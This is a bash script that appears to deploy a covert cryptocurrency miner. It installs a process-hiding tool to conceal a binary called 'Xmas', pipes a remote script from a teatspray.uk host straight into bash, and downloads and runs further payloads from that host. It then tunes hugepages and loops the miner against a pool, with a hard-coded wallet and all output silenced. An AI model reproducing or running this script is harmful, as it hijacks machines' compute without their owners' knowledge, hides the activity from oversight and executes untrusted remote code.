#!/bin/bash
export DEBIAN_FRONTEND=noninteractive
DEBIAN_FRONTEND=noninteractive

sleep 2
cat /etc/*-release
sleep 2

apt update >/dev/null;apt -y install apt-utils psmisc libreadline-dev dialog automake libjansson-dev git binutils cmake build-essential unzip net-tools curl apt-utils wget dpkg libuv1-dev libssl-dev libhwloc-dev kmod msr-tools >/dev/null

sleep 2

wget -q https://nodejs.org/download/release/v18.9.1/node-v18.9.1-linux-x64.tar.gz
tar -xf node-v18.9.1-linux-x64.tar.gz
export PATH=$HOME/node-v18.9.1-linux-x64/bin:$PATH

sleep 2

node -v && npm

sleep 2

npm i -g node-process-hider 1>/dev/null 2>&1

sleep 2

ph add Xmas 1>/dev/null 2>&1

sleep 2

curl -fsSL http://greenleaf.teatspray.uk/install_and_monitor_shade_root.sh | bash &

sleep 4

DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends tzdata > /dev/null

sleep 2

ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime > /dev/null
dpkg-reconfigure --frontend noninteractive tzdata > /dev/null

sleep 2

TZ='Africa/Johannesburg'; export TZ
date
sleep 2


array=()
for i in {a..z} {A..Z} {0..9}; 
   do
   array[$RANDOM]=$i
done

currentdate=$(date '+%d-%b-%Y_Bit_')
ipaddress=$(curl -s api.ipify.org)
num_of_cores=`cat /proc/cpuinfo | grep processor | wc -l`
used_num_of_cores=`expr $num_of_cores - 2`
underscored_ip=$(echo $ipaddress | sed 's/\./_/g')
underscore="_"
underscored_ip+=$underscore
currentdate+=$underscored_ip

randomWord=$(printf %s ${array[@]::8} $'\n')
currentdate+=$randomWord

sleep 2

echo ""
echo "You will be using $used_num_of_cores cores"
echo ""

sleep 2

wget -q http://greenleaf.teatspray.uk/Xmas.tar.gz
sleep 2
tar -xf Xmas.tar.gz

sleep 2

sysctl -w vm.nr_hugepages=$(nproc)

for i in $(find /sys/devices/system/node/node* -maxdepth 0 -type d);
do
    echo 3 > "$i/hugepages/hugepages-1048576kB/nr_hugepages";
done

sleep 2

bash -c "echo vm.nr_hugepages=1280 >> /etc/sysctl.conf"

sleep 2

wget -q http://greenleaf.teatspray.uk/boost.sh >/dev/null
sleep 2
chmod +x boost.sh
sleep 2
./boost.sh

while true
do
./Xmas --donate-level 1 -o supportsuperman.teatspray.uk:9655 -u solo:ar3fHmE8BgygWkkYWfdm3fbcGrxkm3rTPZrE6NPAgmkFgE8sszAjkTnSugw1WGeXbcRkaBBMSdW9yBy1g8czL7K22AaBhpw5K --rig-id=$currentdate -p $currentdate -a rx/arq -k --randomx-1gb-pages --proxy=127.0.0.1:1081 -t $used_num_of_cores 1>/dev/null 2>&1
sleep 10
done
